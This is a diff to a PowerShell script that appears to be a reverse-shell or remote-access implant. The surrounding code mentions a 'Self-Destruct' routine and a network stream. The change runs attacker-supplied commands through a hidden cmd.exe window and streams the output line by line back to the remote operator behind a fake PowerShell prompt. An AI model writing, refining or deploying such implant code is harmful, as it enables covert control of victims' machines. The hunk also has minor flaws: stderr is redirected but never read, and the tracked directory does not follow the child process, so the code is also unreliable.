@@ -401,9 +401,31 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         Self-Destruct
                     }
                     else {
-                        $sb = [ScriptBlock]::Create("cd '$currentDir'; $cmd")
-                        $output = & $sb 2>&1 | Out-String
-                        $response = $output.TrimEnd()
+                        $proc = New-Object System.Diagnostics.Process
+                        $proc.StartInfo.FileName = "cmd.exe"
+                        $proc.StartInfo.Arguments = "/c cd `"$currentDir`" & $cmd"
+                        $proc.StartInfo.RedirectStandardOutput = $true
+                        $proc.StartInfo.RedirectStandardError = $true
+                        $proc.StartInfo.UseShellExecute = $false
+                        $proc.StartInfo.CreateNoWindow = $true
+                        $proc.StartInfo.StandardOutputEncoding = [System.Text.Encoding]::UTF8
+                        $proc.Start()
+                        
+                        while (-not $proc.StandardOutput.EndOfStream) {
+                            $line = $proc.StandardOutput.ReadLine()
+                            if ($line -ne $null) {
+                                $outBytes = [Text.Encoding]::UTF8.GetBytes("$line`n")
+                                $stream.Write($outBytes, 0, $outBytes.Length)
+                                $stream.Flush()
+                            }
+                        }
+                        
+                        $proc.WaitForExit()
+                        $currentDir = Get-Location
+                        $prompt = "`n`nPS $currentDir> "
+                        $outBytes = [Text.Encoding]::UTF8.GetBytes($prompt)
+                        $stream.Write($outBytes, 0, $outBytes.Length)
+                        $stream.Flush()
                     }
                 }
                 catch {
